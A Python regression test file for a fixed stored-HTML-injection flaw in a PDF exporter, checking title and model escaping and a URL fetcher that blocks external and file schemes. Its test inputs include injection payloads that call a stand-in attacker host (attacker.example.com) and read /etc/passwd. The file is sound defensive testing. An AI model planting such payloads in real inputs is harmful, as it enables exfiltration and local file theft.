"""Pin /security-review finding (2026-05-27): stored HTML injection in PDF export.

`backend/exporters/pdf.py` interpolated `conversation.name` and
`conversation.model` into the HTML template via f-string with no
`escape_html()` call. Every other user-controlled field in the same file
IS escaped, so this was an oversight, not a deliberate trust boundary.

The resulting HTML rendered through WeasyPrint with a `url_fetcher`
that deferred unknown URLs to `weasyprint.urls.default_url_fetcher`.
The default fetcher registers `FileHandler`, `HTTPHandler`,
`HTTPSHandler`, and `FTPHandler` with no `allowed_protocols`
restriction. Combined with the unescaped title, an attacker who
seeded hostile HTML into a conversation title (paste-the-prompt
social engineering — Claude.ai/Code auto-titles from the first user
message) could exfiltrate via outbound HTTPS or read local files
via `<img src="file:///...">` when the victim exported to PDF.

Two-part fix pinned here:

1. `conversation.name` (title, h1) and `conversation.model` (meta
   block) are escaped via `escape_html()` before interpolation.
2. The url_fetcher rejects unknown URL schemes: only the three
   local-API shapes (`/api/cc-image`, `/api/{org}/files/...`,
   `/api/attachments/...`) and inline `data:` URIs resolve.
   Anything else returns the transparent-PNG placeholder.

2026-10-13: the fetcher is a ``weasyprint.urls.URLFetcher`` subclass that
returns ``URLFetcherResponse``. WeasyPrint 70 rejects the old dict shape,
so these tests read the response body.
"""

from __future__ import annotations

from datetime import datetime, timezone

from backend.exporters.pdf import (
    _TRANSPARENT_1x1_PNG,
    _build_pdf_url_fetcher,
    conversation_to_html,
)
from backend.models import ConversationDetail


def _body(response) -> bytes:
    return response.read()


def _make_conv(name: str = "Test", model: str = "claude-3-5-sonnet") -> ConversationDetail:
    now = datetime(2026, 5, 27, 12, 0, 0, tzinfo=timezone.utc)
    return ConversationDetail(
        uuid="11111111-2222-3333-4444-555555555555",
        name=name,
        model=model,
        created_at=now,
        updated_at=now,
        messages=[],
    )


def test_conversation_name_is_escaped_in_title_and_h1():
    hostile = '<link rel="stylesheet" href="https://attacker.example.com/log.css">'
    html = conversation_to_html(_make_conv(name=hostile))

    assert "<link rel=" not in html, (
        "raw <link> survived into PDF HTML — title is not escape_html'd"
    )
    assert "attacker.example.com" not in html or "&lt;link" in html, (
        "attacker URL is reachable as an actual stylesheet href"
    )
    assert "&lt;link" in html, "expected escaped form &lt;link in output"


def test_conversation_name_script_tag_is_escaped():
    hostile = "<script>alert(1)</script>"
    html = conversation_to_html(_make_conv(name=hostile))

    assert "<script>" not in html, "raw <script> survived into PDF HTML"
    assert "&lt;script&gt;" in html, "expected escaped &lt;script&gt; form"


def test_conversation_model_is_escaped():
    hostile_model = '<img src="file:///etc/passwd">'
    html = conversation_to_html(_make_conv(model=hostile_model))

    assert '<img src="file://' not in html, (
        "raw file:// img survived into PDF HTML — model field not escaped"
    )
    assert "&lt;img" in html, "expected escaped &lt;img form"


def test_url_fetcher_returns_placeholder_for_external_https():
    """The fetcher must NOT defer to weasyprint.urls.default_url_fetcher
    for arbitrary external URLs. The default fetcher would issue a real
    network request (SSRF / beacon)."""
    fetcher = _build_pdf_url_fetcher(_make_conv())

    result = fetcher("https://attacker.example.com/log.css?v=victim")

    assert _body(result) == _TRANSPARENT_1x1_PNG, (
        "external https:// URL was not neutered — fetcher must return placeholder"
    )


def test_url_fetcher_returns_placeholder_for_file_scheme():
    """`file://` URLs must not read arbitrary local files via the default fetcher."""
    fetcher = _build_pdf_url_fetcher(_make_conv())

    result = fetcher("file:///etc/passwd")

    assert _body(result) == _TRANSPARENT_1x1_PNG, (
        "file:// URL was not neutered — fetcher must return placeholder"
    )


def test_url_fetcher_returns_placeholder_for_ftp_scheme():
    fetcher = _build_pdf_url_fetcher(_make_conv())

    result = fetcher("ftp://attacker.example.com/exfil")

    assert _body(result) == _TRANSPARENT_1x1_PNG


def test_url_fetcher_still_passes_data_uri_through():
    """Bidirectional pair: legitimate `data:` URIs must still resolve.
    WeasyPrint may emit data URIs internally (e.g., embedded fonts via
    @font-face). The fix tightens external schemes, not inline content."""
    fetcher = _build_pdf_url_fetcher(_make_conv())

    tiny_png_b64 = (
        "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mNk"
        "+A8AAQUBAScY42YAAAAASUVORK5CYII="
    )
    result = fetcher(f"data:image/png;base64,{tiny_png_b64}")

    # data: URIs are decoded, not routed to the placeholder branch.
    import base64

    assert _body(result) == base64.b64decode(tiny_png_b64)
    assert result.content_type == "image/png"


def test_url_fetcher_uses_the_weasyprint_fetcher_api():
    """WeasyPrint 70 removed dict results and ``default_url_fetcher``.
    A plain function that returns a dict broke every image in a PDF."""
    from weasyprint.urls import URLFetcher, URLFetcherResponse

    fetcher = _build_pdf_url_fetcher(_make_conv())
    assert isinstance(fetcher, URLFetcher)
    result = fetcher("https://attacker.example.com/x.png")
    assert isinstance(result, URLFetcherResponse)
    assert result.content_type == "image/png"
